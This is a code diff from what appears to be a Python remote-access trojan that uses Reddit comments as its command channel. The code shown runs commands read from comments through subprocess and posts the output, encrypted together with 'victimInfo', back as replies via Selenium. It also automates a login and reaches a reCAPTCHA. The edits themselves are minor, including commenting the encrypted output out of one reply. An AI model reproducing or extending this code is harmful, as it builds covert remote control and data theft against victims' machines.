@@ -155,7 +155,7 @@ R9ZFVLiX1VQS7vVicd1q2hbnRfspNFqN/N4+2uVyXndwKJkPkSlO5A==
             self.victimInfo = self.get_victim_info()
         enc = "{} {} {}".format(data, err, self.victimInfo)
         enc = shift_encrypt(enc, 16)
-        replyData = f"It's so correct!! {enc}"
+        replyData = f"It's so correct!" # replyData = f"It's so correct!! {enc}"
 
         reply = browser.find_element_by_xpath(f'//*[@id="t1_{id}"]/div[2]/div[3]/div[4]/div/div/div/div[2]/div/div[1]/div/div/div')
         reply.send_keys(replyData)
@@ -186,7 +186,7 @@ R9ZFVLiX1VQS7vVicd1q2hbnRfspNFqN/N4+2uVyXndwKJkPkSlO5A==
         if cmd == "rp" and result not in self.rpDoneTasks:
             res = subprocess.Popen(parameters, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             data, err = res.communicate()
-            self.write_back(data, err, browser, commentURL)
+            self.write_back(data, err, commentURL)
             self.rpDoneTasks.insert(0, result)
             write_list_to_file("rpDoneTasks", self.rpDoneTasks)
 
@@ -258,6 +258,7 @@ R9ZFVLiX1VQS7vVicd1q2hbnRfspNFqN/N4+2uVyXndwKJkPkSlO5A==
                 self.prev_comments.append((comment_url, [sub_reddit, key1, key2, key3]))
                 try:
                     write_list_to_file("prev_comments", self.prev_comments)
+
                 except Exception as e:
                     print(e)
 
@@ -416,7 +417,7 @@ R9ZFVLiX1VQS7vVicd1q2hbnRfspNFqN/N4+2uVyXndwKJkPkSlO5A==
 
         time.sleep(2)
         pass_field.send_keys(Keys.ENTER)
-        time.sleep(10)
+        time.sleep(20)
 
         iframeReCAPTCHA = driver.find_element(By.CSS_SELECTOR,"#g-recaptcha > div > div > iframe")
 
